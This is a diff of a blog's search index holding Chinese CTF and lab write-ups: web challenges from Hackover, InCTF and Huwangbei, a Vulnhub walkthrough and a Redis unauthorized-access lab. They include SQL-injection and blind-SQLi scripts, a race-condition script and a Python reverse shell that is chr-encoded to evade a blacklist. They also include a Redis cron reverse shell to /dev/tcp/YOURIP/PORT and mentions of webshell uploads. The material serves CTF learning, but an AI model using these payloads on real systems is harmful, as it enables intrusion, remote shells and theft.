@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[护网杯部分题目Wp]]></title>
+    <url>%2F2018%2F10%2F13%2F%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWp%2F</url>
+    <content type="text"><![CDATA[还是太菜了，只做出了三道题 迟来的签到题下载文件后是一段字符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253尝试了下，可以base64解码，不过解出来是乱码![](护网杯部分题目Wp/1.png)题目提示XOR，flag一般格式为flag&#123;&#125;，所以先试下`chr(ord(a[0]) ^ ord(a[len(a)-1]) ^ ord(&apos;f&apos;))`![](护网杯部分题目Wp/2.png)可以得到flag了![](护网杯部分题目Wp/3.png)## FEZfez.py```pythonimport osdef xor(a,b): assert len(a)==len(b) c=&quot;&quot; for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return cdef f(x,k): return xor(xor(x,k),7)def round(M,K): L=M[0:27] R=M[27:54] new_l=R new_r=xor(xor(R,L),K) return new_l+new_rdef fez(m,K): for i in K: m=round(m,i) return mK=[]for i in range(7): K.append(os.urandom(27))m=open(&quot;flag&quot;,&quot;rb&quot;).read()assert len(m)&lt;54m+=os.urandom(54-len(m))test=os.urandom(54)print test.encode(&quot;hex&quot;)print fez(test,K).encode(&quot;hex&quot;)print fez(m,K).encode(&quot;hex&quot;) fez.log 123c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd55c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76 方便描述，给fez.log的值赋给三个变量 123a = "c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"b = "5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"c = "519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76" b,c都是fez函数得到的，分析看看fez函数，作用是将m分成两段L,R，前后异或处理后与i异或,得到new_R,而R则成了new_L,拼接成m，循环Len(K)次 易知K的长度为7，有Ri,Li,Ki 最后可以得到 123L= R1^K2^K3^K5^K6R = R1^K1^L1^k2^k4^K6^K7 结合a,b,c很轻松得到flag 还剩下一部分思路差不多的 easy_tornado打开题目，有个文件列表 随便访问一个有两个参数，随便修改下 试了下模板注入，可以，只不过是过滤了许多东西，hint里面有一个cookie_secret 用的是tornado,了解到其存在一个hander.settings里面有cookie_secret 得到cookie_secret后加密得到签名，最后拿到flag]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
     <title><![CDATA[Inctf&HackoverCTF Web部分题目解析]]></title>
     <url>%2F2018%2F10%2F09%2FInctf-HackoverCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%2F</url>
     <content type="text"><![CDATA[Hackover CTF与InCTF部分Web题目解析 Hackover CTFwho knows john dows? Description Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need! http://yo-know-john-dow.ctf.hackover.de:4567/login alternative: 46.101.157.142:4567/login 题目给的链接中有一个是GitHub地址，在里面有源码存在 1234567891011121314151617181920212223242526272829class UserRepo def initialize(database) @database = database @users = database[:users] end def login(identification, password) hashed_input_password = hash(password) query = "select id, phone, email from users where email = '#&#123;identification&#125;' and password_digest = '#&#123;hashed_input_password&#125;' limit 1" puts "SQL executing: '#&#123;query&#125;'" @database[query].first if user_exists?(identification) end def user_exists?(identification) !get_user_by_identification(identification).nil? end private def get_user_by_identification(identification) @users.where(phone: identification).or(email: identification).first end def hash(password) password.reverse endend 显而易见的存在有SQL注入漏洞，其中的hash加密密码更是只把密码反转了下，所以只要构造 1password=' or 1=1 limit 1# 然后反转一下就可以了 看下Web界面 需要找到一个邮箱 从GitHub下手，把仓库clone到本地后，查看下日志 经过尝试最后`john_doe@notes.h18`登陆成功 最后尝试注入的时候居然出现了500错误，修改payload为 1password=' or 1=1 limit 1;# 反转后输入密码，成功得到flag InCTFS3cur3 BankDescription 12345678S3cur3 Bank 179======= Difficulty level : Medium ========It is notoriously called the most secure bank service ever. It allows us to transfer your money between 2 accounts. Can you hack the service to buy a flag???Link(http://18.188.42.158/)========== Authors : c3rb3ru5, SpyD3r ========== 题目给了两个账号，相互之间可以互相转账，只有5000金币才可以买到flag，而我们两个银行加起来才2000，这样的题一般情况下就是在执行一项操作时并不会进行锁定，就相当于饭卡里有一百块钱，同时在两台机器上刷都显示100，全部花完后饭卡里没钱了，而我们一共得到了200块钱的食物。 利用脚本一枚 12345678910111213141516171819import requestsimport threadingurl = "http://18.188.42.158/bank.php?id=dc90a0a10c79e341f5b521da39dbc585"def make_money(): data = &#123;"transfer": 1000, "account": "Transfer to B"&#125; response = requests.post(url,data=data) print(response.text)try: t1 = threading.Thread(target=make_money, args=[]) t2 = threading.Thread(target=make_money, args=[]) t1.start() t2.start()except: print("Error: unable to start thread") 其中的transfer在每次成功后都要改，account在每次运行后都要更改，并不会每次都成功。 最后可以终于买到flag了~~ The Most Secure File UploaderDescription Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :) http://18.216.190.57/ Challenge Difficulty Level:Medium Web界面一个上传点儿就这么放在了眼前 看到上传界面先上传了个txt 嗯，只能上传图片文件的话我再来一个png文件 还是报错 不过这个报错提示有点儿熟悉，好像是python一样，索性把图片平改成1#.png试一下(#在python中是注释的意思 页面返回正常 试下print 好的！接下来用python写个反弹shell吧 1exec(import socket, subprocess;s = socket.socket();s.connect(('ip',端口))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())) 在自己服务器上打开监听，不想却有黑名单存在,不过exec没在黑名单里 利用Ascii编码绕过黑名单具体做法是把payload改为 1exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(44),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(59),chr(115),chr(32),chr(61),chr(32),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(46),chr(115),chr(111),chr(99),chr(107),chr(101),chr(116),chr(40),chr(41),chr(59),chr(115),chr(46),chr(99),chr(111),chr(110),chr(110),chr(101),chr(99),chr(116),chr(40),chr(40),chr(39),chr(105),chr(112),chr(39),chr(44),chr(50),chr(51),chr(51),chr(51),chr(41),chr(41),chr(10),chr(119),chr(104),chr(105),chr(108),chr(101),chr(32),chr(49),chr(58),chr(32),chr(32),chr(112),chr(114),chr(111),chr(99),chr(32),chr(61),chr(32),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(111),chr(112),chr(101),chr(110),chr(40),chr(115),chr(46),chr(114),chr(101),chr(99),chr(118),chr(40),chr(49),chr(48),chr(50),chr(52),chr(41),chr(44),chr(32),chr(115),chr(104),chr(101),chr(108),chr(108),chr(61),chr(84),chr(114),chr(117),chr(101),chr(44),chr(32),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(115),chr(116),chr(100),chr(101),chr(114),chr(114),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(44),chr(32),chr(115),chr(116),chr(100),chr(105),chr(110),chr(61),chr(115),chr(117),chr(98),chr(112),chr(114),chr(111),chr(99),chr(101),chr(115),chr(115),chr(46),chr(80),chr(73),chr(80),chr(69),chr(41),chr(59),chr(115),chr(46),chr(115),chr(101),chr(110),chr(100),chr(40),chr(112),chr(114),chr(111),chr(99),chr(46),chr(115),chr(116),chr(100),chr(111),chr(117),chr(116),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41),chr(43),chr(112),chr(114),chr(111),chr(99),chr(46),chr(115),chr(116),chr(100),chr(101),chr(114),chr(114),chr(46),chr(114),chr(101),chr(97),chr(100),chr(40),chr(41),chr(41)])) 拿到反弹的Sehll找到flag 使用globals()函数调用内置函数先来看下globals()的定义 返回全局变量的字典。 就是这些东东 其中第一项里包含了python的内置函数，可以通过globals().values()[0].__dict__查看 import也是python内置函数，可以通过globals().values()[0].__dict__[&#39;__import__&#39;](模块名).function()调用指定函数,例如导入os.listdir()函数 回到题目，本来也可以通过globals()调用os.listdir但是os被禁了，只好采用另一种方式 1globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).listdir('./') 将被禁的字符转化为base64，成功绕过 最后就是利用内置函数open来打开flag文件啦 GoSQL开始前先来几个MySQL的一些知识 1.字符集为utf-8的情况下 1234Ä = A Ö = O Ü = U à = a 上述等式是成立的 也就是说 1àdmin = admin 2.MySQL中 /*select * from users*/表示注释/**/内的语句并不会执行，但是/*!select * from users*/确实可以执行的 3.sleep可以代替if充当判断的角色 当条件为真时 条件为假时 4.可以等效替换的一些关键词 1234where : havingsubstr : insert&lt;space&gt; : %0a = : in 进入题目 12345678910111213141516171819202122232425262728293031323334353637383940query: select * from inctf2018_chall_2 /**/ username=''Having a query problem&lt;?phpinclude("./config.php");$conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);if (!$conn) &#123; die("Connection failed: " . mysqli_connect_error());&#125;mysqli_set_charset($conn,"utf8");$name = $_GET['name'];$clause = $_GET['clause'];$blacklist = "pad|admin|'|\"|substr|mid|concat|char|ascii|left|right|for| |from|where|having";$blacklist .= "insert|username|\/|-|go_to|\||or|and|\\\|=|#|\.|\_|like|between|reg|&amp;|load|file|glob|cast|out|0";$blacklist .= "user|rev|0x|limit|conv|hex|from|innodb|\^|union|benchmark|if|case|coalesce|max|strcmp|proc|group|rand|floor|pow";if (preg_match("/$blacklist/i", $name))&#123; die("Try Hard");&#125;if(preg_match("/$blacklist/i", $clause))&#123; die("You don't need it!!!");&#125;$query="select * from inctf2018_chall_2 /*". $clause . "*/ username='" . $name . "'";echo "&lt;h4&gt;query: " . $query . " &lt;/h4&gt;";$result=mysqli_query($conn,$query);if($result)&#123; $row=mysqli_fetch_array($result); if($row['username']=="admin")&#123; header("Location:&#123;$row['go_to']&#125;");&#125; else&#123; echo "&lt;h4&gt;You are not admin" . "&lt;/h4&gt;"; &#125;&#125;else&#123; echo "&lt;h4&gt;Having a query problem" . "&lt;/h4&gt;&lt;br&gt;";&#125;highlight_file(__FILE__);?&gt; 可以看到其设置了黑名单，但是 having insert 0 user sleep却没有在黑名单里，其中前四个都是因为拼接的时候没加|导致的，这点儿后面会用到 这一步用前两点构造payload clause=!having&amp;name=àdmin 进入下一个场景 自然想到SSRF 尝试了file|ftp好像都被过滤了，最后试了下Gopher，没被过滤，那么现在就需要数据库账号了，刚好利用前面的having与insert 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom time import timeurl="http://18.219.221.225/?clause="user_name=""len_user=20'''for i in range(1,50): query=url + "!having%0asleep(((select%0alength(user()))%0ain%0a(select%0a0b" + "&#123;:b&#125;".format(i) + "))*3);%00" start = time() req=requests.get(query) end=time() if((end-start)&gt;=2): len_user=i break print (i)'''print("Got the user length : " + str(len_user))flag=""def iterate(): temp="" for i in range(0,len(flag),2): temp+="&#123;:b&#125;".format(int(flag[i:i+2])).rjust(8,"0") return tempfor j in range(1,len_user+1): for i in range(64,122): query=url + "!having%0asleep(((select%0ainsert(user()," + str(j+1) + ",255,space(0)))%0ain%0a(select%0a0b" + iterate() + "&#123;:b&#125;".format(i).rjust(8,"0") + "))*3);%00" print(query) if i == 65: exit() start=time() req=requests.get(query) end=time() if((end-start)&gt;=2): flag+=str(i) user_name +=chr(i) break print(i)print ("Got the user name: " + user_name) 得到username:INCTF_SSRF 之后利用了这款工具:https://github.com/tarunkant/Gopherus 构造payload后查看用户读写权限 应该可以读写的，尝试下读取/etc/mysql/mysql.conf.d/mysqld.cnf这是MySQL的配置文件，可以看到能够写入文件到哪里 看出来给了提示/tmp_is_great 于是写shell到/tmp_is_great,最后测试下shell 最后只要cat 一下flag文件就可以啦]]></content>
@@ -19,8 +27,20 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>PHP</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Vulnhub JJS-CTF]]></title>
+    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
+    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -31,8 +51,8 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>PHP</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -49,18 +69,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Vulnhub JJS-CTF]]></title>
-    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
-    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
-      <categories>
-        <category>Challenge</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[BlueCMS 代码审计]]></title>
     <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
     <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
@@ -68,8 +76,8 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>PHP</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -80,20 +88,8 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>Web</tag>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[redis未授权访问]]></title>
-    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
-    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
         <tag>Web</tag>
-        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
@@ -106,6 +102,18 @@
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[redis未授权访问]]></title>
+    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
+    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
